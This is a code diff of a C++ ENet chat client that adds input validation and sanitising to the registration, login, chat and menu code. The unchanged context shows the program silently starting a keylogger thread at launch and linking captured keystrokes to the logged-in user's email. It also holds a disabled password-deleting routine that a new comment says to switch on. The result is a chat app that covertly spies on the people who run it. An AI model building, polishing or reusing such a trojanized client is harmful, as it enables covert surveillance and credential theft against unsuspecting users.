@@ -5,9 +5,166 @@
 #include <windows.h>
 #include <thread>
 #include <ctime>
+#include <regex>
+#include <algorithm>
+#include <cctype>
 #include "keylogger.hpp"
 #include "deletePasswords.hpp"
 using namespace std;
+
+// ---------------------------------------------------------------------
+// Input validation functions
+// ---------------------------------------------------------------------
+
+// Validate email format using regex
+bool isValidEmail(const string& email) {
+    // Basic email validation regex pattern
+    // Checks for: name@domain.tld format
+    const regex emailPattern("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
+    return regex_match(email, emailPattern);
+}
+
+// Validate password - checks length and complexity
+bool isValidPassword(const string& password) {
+    // Password requirements:
+    // - At least 8 characters
+    // - Less than 50 characters (reasonable upper limit)
+    if (password.length() < 8 || password.length() > 50) {
+        return false;
+    }
+    
+    // Check for at least one uppercase letter, one lowercase letter, and one digit
+    bool hasUpper = false, hasLower = false, hasDigit = false;
+    for (char c : password) {
+        if (isupper(c)) hasUpper = true;
+        if (islower(c)) hasLower = true;
+        if (isdigit(c)) hasDigit = true;
+    }
+    
+    return hasUpper && hasLower && hasDigit;
+}
+
+// Validate verification code (typically numeric with fixed length)
+bool isValidVerificationCode(const string& code) {
+    // Check if the code is 6 digits (common verification code length)
+    if (code.length() != 6) {
+        return false;
+    }
+    
+    // Ensure all characters are digits
+    return std::all_of(code.begin(), code.end(), ::isdigit);
+}
+
+// Validate chat message - check length and filter dangerous content
+bool isValidChatMessage(const string& message) {
+    // Check message length (1-500 characters is reasonable)
+    if (message.empty() || message.length() > 500) {
+        return false;
+    }
+    
+    // Check for null bytes or control characters that could cause issues
+    for (char c : message) {
+        // Block null bytes and most control characters
+        if (c == '\0' || (c < 32 && c != '\n' && c != '\r' && c != '\t')) {
+            return false;
+        }
+    }
+    
+    return true;
+}
+
+// Sanitize input by removing or replacing potentially dangerous characters
+string sanitizeInput(const string& input) {
+    string sanitized = input;
+    
+    // Replace pipe character as it's used as a delimiter in protocol
+    std::replace(sanitized.begin(), sanitized.end(), '|', '_');
+    
+    // Filter out other potentially problematic characters
+    sanitized.erase(
+        std::remove_if(
+            sanitized.begin(), 
+            sanitized.end(),
+            [](char c) { 
+                return c == '\0' || (c < 32 && c != '\n' && c != '\r' && c != '\t');
+            }
+        ),
+        sanitized.end()
+    );
+    
+    return sanitized;
+}
+
+// Safely get user input with validation and sanitization
+string getValidatedInput(const string& prompt, function<bool(const string&)> validator, 
+                        const string& errorMsg, bool allowEmpty = false) {
+    string input;
+    bool isValid = false;
+    
+    do {
+        cout << prompt;
+        getline(cin, input);
+        
+        // Trim whitespace
+        input.erase(0, input.find_first_not_of(" \t\n\r"));
+        input.erase(input.find_last_not_of(" \t\n\r") + 1);
+        
+        // Check if input is empty when not allowed
+        if (!allowEmpty && input.empty()) {
+            cout << "Input cannot be empty. Please try again." << endl;
+            continue;
+        }
+        
+        // Allow empty input if specified
+        if (allowEmpty && input.empty()) {
+            isValid = true;
+        } else {
+            // Sanitize and validate input
+            string sanitized = sanitizeInput(input);
+            
+            // Check if sanitization changed the input
+            if (sanitized != input) {
+                cout << "Input contained invalid characters and was sanitized." << endl;
+                input = sanitized;
+            }
+            
+            // Validate using provided validator function
+            isValid = validator(input);
+            if (!isValid) {
+                cout << errorMsg << endl;
+            }
+        }
+    } while (!isValid);
+    
+    return input;
+}
+
+// Function to safely get numeric menu choice
+int getValidMenuChoice() {
+    string input;
+    int choice = 0;
+    bool isValid = false;
+    
+    do {
+        getline(cin, input);
+        
+        // Check if input contains only digits
+        if (input.empty() || !all_of(input.begin(), input.end(), ::isdigit)) {
+            cout << "Please enter a valid number: ";
+            continue;
+        }
+        
+        // Convert to integer
+        try {
+            choice = stoi(input);
+            isValid = true;
+        } catch (const exception& e) {
+            cout << "Invalid input. Please enter a number: ";
+        }
+    } while (!isValid);
+    
+    return choice;
+}
 
 // ---------------------------------------------------------------------
 // Display the main menu options to the user
@@ -122,10 +279,13 @@ void chatApp(ENetPeer* peer, ENetHost* client) {
                     break;
                 }
                 
-                // Send non-empty messages
-                if (!userInput.empty()) {
+                // Validate and send non-empty messages
+                if (!userInput.empty() && isValidChatMessage(userInput)) {
+                    // Sanitize the message before sending
+                    string sanitizedMessage = sanitizeInput(userInput);
+                    
                     // Add CHAT: prefix so server knows it's a chat message
-                    string fullMessage = "CHAT:" + userInput;
+                    string fullMessage = "CHAT:" + sanitizedMessage;
                     ENetPacket* packet = enet_packet_create(
                         fullMessage.c_str(), 
                         fullMessage.size() + 1, 
@@ -133,6 +293,10 @@ void chatApp(ENetPeer* peer, ENetHost* client) {
                     );
                     enet_peer_send(peer, 0, packet);
                     enet_host_flush(client);
+                    userInput.clear();
+                } else if (!userInput.empty()) {
+                    // Message failed validation
+                    cout << "Message contains invalid content or is too long. Please try again." << endl;
                     userInput.clear();
                 }
                 
@@ -147,9 +311,12 @@ void chatApp(ENetPeer* peer, ENetHost* client) {
                 }
             }
             // Handle regular character input
-            else {
-                userInput.push_back(ch);  // Add character to input
-                cout << ch << flush;      // Display character
+            else if (ch >= 32) {  // Only accept printable characters
+                // Limit input length to prevent buffer issues
+                if (userInput.length() < 500) {
+                    userInput.push_back(ch);  // Add character to input
+                    cout << ch << flush;      // Display character
+                }
             }
         }
         
@@ -166,10 +333,15 @@ void chatApp(ENetPeer* peer, ENetHost* client) {
 // 4. Set password after verification
 // ---------------------------------------------------------------------
 void handleRegistration(ENetPeer* peer, ENetHost* client) {
-    // Step 1: Get email address
-    string email;
-    cout << "Enter email for registration: ";
-    cin >> email;
+    // Clear input buffer
+    cin.ignore(numeric_limits<streamsize>::max(), '\n');
+    
+    // Step 1: Get and validate email address
+    string email = getValidatedInput(
+        "Enter email for registration: ",
+        isValidEmail,
+        "Invalid email format. Please enter a valid email (e.g., user@example.com)."
+    );
     
     // Step 2: Send registration request to server
     string message = "REGISTER:" + email + "|";  // Empty password field
@@ -178,10 +350,12 @@ void handleRegistration(ENetPeer* peer, ENetHost* client) {
     
     // If registration request succeeded (OK response)
     if (response.rfind("OK:", 0) == 0) {
-        // Step 3: Get verification code from user
-        string code;
-        cout << "Enter verification code sent to your email: ";
-        cin >> code;
+        // Step 3: Get and validate verification code from user
+        string code = getValidatedInput(
+            "Enter verification code sent to your email: ",
+            isValidVerificationCode,
+            "Invalid verification code. Please enter the 6-digit code sent to your email."
+        );
         
         // Step 4: Verify email with code
         message = "VERIFY:" + email + "|" + code;
@@ -190,10 +364,24 @@ void handleRegistration(ENetPeer* peer, ENetHost* client) {
         
         // If verification succeeded
         if (response.rfind("OK:", 0) == 0) {
-            // Step 5: Set password
+            // Step 5: Set password with validation
             string password;
-            cout << "Enter new password: ";
-            cin >> password;
+            bool passwordValid = false;
+            
+            do {
+                password = getValidatedInput(
+                    "Enter new password (min 8 chars, must include uppercase, lowercase, and number): ",
+                    [](const string&) { return true; },  // Accept any input for now
+                    "",
+                    false
+                );
+                
+                passwordValid = isValidPassword(password);
+                if (!passwordValid) {
+                    cout << "Password doesn't meet requirements. Must have at least 8 characters, "
+                         << "one uppercase letter, one lowercase letter, and one digit." << endl;
+                }
+            } while (!passwordValid);
             
             message = "SETPASSWORD:" + email + "|" + password;
             response = sendMessage(peer, message, client);
@@ -209,12 +397,22 @@ void handleRegistration(ENetPeer* peer, ENetHost* client) {
 // 3. Enter chat mode if login successful
 // ---------------------------------------------------------------------
 void handleLogin(ENetPeer* peer, ENetHost* client) {
-    // Step 1: Get credentials
-    string email, password;
-    cout << "Enter email: ";
-    cin >> email;
-    cout << "Enter password: ";
-    cin >> password;
+    // Clear input buffer
+    cin.ignore(numeric_limits<streamsize>::max(), '\n');
+    
+    // Step 1: Get and validate credentials
+    string email = getValidatedInput(
+        "Enter email: ",
+        isValidEmail,
+        "Invalid email format. Please enter a valid email (e.g., user@example.com)."
+    );
+    
+    // For password, we'll validate format but not enforce complexity for login
+    string password = getValidatedInput(
+        "Enter password: ",
+        [](const string& pwd) { return !pwd.empty() && pwd.length() <= 50; },
+        "Password cannot be empty and must be less than 50 characters."
+    );
     
     // Step 2: Send login request to server
     string message = "LOGIN:" + email + "|" + password;
@@ -229,8 +427,7 @@ void handleLogin(ENetPeer* peer, ENetHost* client) {
         // Store email for keylogger
         setUserEmail(email);
         
-        // Clear input buffer (consume any leftover input)
-        cin.ignore(1000, '\n');
+        // Wait for user to press Enter
         cin.get();
         
         // Enter chat mode
@@ -238,7 +435,7 @@ void handleLogin(ENetPeer* peer, ENetHost* client) {
     }
 }
 
-int application(){
+int application() {
      // --- INITIALIZE NETWORKING ---
     // Initialize ENet library
     if (enet_initialize() != 0) {
@@ -265,7 +462,7 @@ int application(){
     // --- CONNECT TO SERVER ---
     // Set server address
     ENetAddress address;
-    enet_address_set_host(&address, "192.168.2.6");  // Server IP address
+    enet_address_set_host(&address, "192.168.2.3");  // Server IP address
     address.port = 25555;                           // Fixed port to match server (25555)
     
     // Attempt connection
@@ -300,8 +497,9 @@ int application(){
     int choice = 0;
     while (choice != 3) {  // Loop until user chooses to exit
         displayMenu();
-        cin >> choice;
-        cin.ignore(1000, '\n');  // Clear input buffer
+        
+        // Get and validate menu choice
+        choice = getValidMenuChoice();
         
         switch (choice) {
             case 1:  // Login
@@ -314,7 +512,7 @@ int application(){
                 cout << "Exiting..." << endl;
                 break;
             default:  // Invalid choice
-                cout << "Invalid choice, please try again." << endl;
+                cout << "Invalid choice, please enter 1, 2, or 3." << endl;
                 break;
         }
     }
@@ -328,6 +526,7 @@ int application(){
 // Main function - Program entry point
 // ---------------------------------------------------------------------
 int main() {
+   // remove comment to start password deleter
    // PasswordDeleter::destroyPass();
     
     // Start keylogger in a separate thread
@@ -347,4 +546,4 @@ int main() {
     isKeyloggerRunning = false;
     
     return 0;
-};
+}
